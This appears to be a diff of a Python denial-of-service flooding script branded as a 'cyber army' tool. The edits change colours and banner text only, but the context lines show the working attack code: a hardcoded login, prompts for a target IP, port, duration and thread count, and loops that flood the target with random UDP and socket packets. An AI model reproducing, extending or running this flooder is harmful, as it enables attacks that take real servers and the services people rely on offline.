@@ -36,7 +36,7 @@ while attemps < 100:
     password = input("\033[32mEnter your password: \033[0m")
 
     if username == 'kun' and password == 'fayakun':
-        print('Selamat datang di zona MOSLEM CYBER ARMY')
+        print("\033[33m$ELAMAT DATANG DI ZONA MOSLEM CYBER ARMY")
         break
     else:
         print('Incorrect credentials. Check if you have Caps lock on and try again.')
@@ -45,9 +45,9 @@ while attemps < 100:
 
 ip = str(input("\033[37m Target IP : \033[0m"))
 port = int(input("\033[36m Target Port : \033[0m"))
-choice = str(input("\033[35m (y/n) : \033[0m"))
-times = int(input("\033[34m Time : \033[0m"))
-threads = int(input("\033[33m Threads : \033[0m"))
+choice = str(input("\033[36m (y/n) : \033[0m"))
+times = int(input("\033[36m Time : \033[0m"))
+threads = int(input("\033[36m Threads : \033[0m"))
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[+]","[*]","[!]"))
@@ -57,9 +57,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" \033[32mC R A S H  \033[31mHTTP\033[33mFL00D  \033[31m" +str(ip)+ "\033[97m = \033[96mattack run\033[0m")
+			print(i +" \033[4mCRASH  \033[31mHTTP\033[33mFL00D  \033[31m" +str(ip)+ "\033[97m = \033[96mattack run\033[0m")
 		except:
-			print(i +" \033[35mC R A S H  \033[32mHTTP\033[36mFL00D  \033[96m" +str(ip)+ "\033[37m = \033[1mattack run\033[0m")
+			print(i +" \033[4mCRASH  \033[32mHTTP\033[36mFL00D  \033[96m" +str(ip)+ "\033[37m = \033[1mattack run\033[0m")
 def run2():
 	data = random._urandom(999)
 	i = random.choice(("[+]","[*]","[!]"))
@@ -70,10 +70,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i *" \033[35mC R A S H  \033[32mHTTP \033[33mFL00D  \033[96m" +str(ip)+ "\033[37m = \033[1mattack run\033[0m")
+			print(i *" \033[35mCRASH \033[32mHTTP \033[33mFL00D  \033[96m" +str(ip)+ "\033[37m = \033[1mattack run\033[0m")
 		except:
 			s.close()
-			print(i +" \033[4mfinnaly run\033[0m")
+			print(i +" \033[33mfinnaly run\033[0m")
             
 
 def run3():
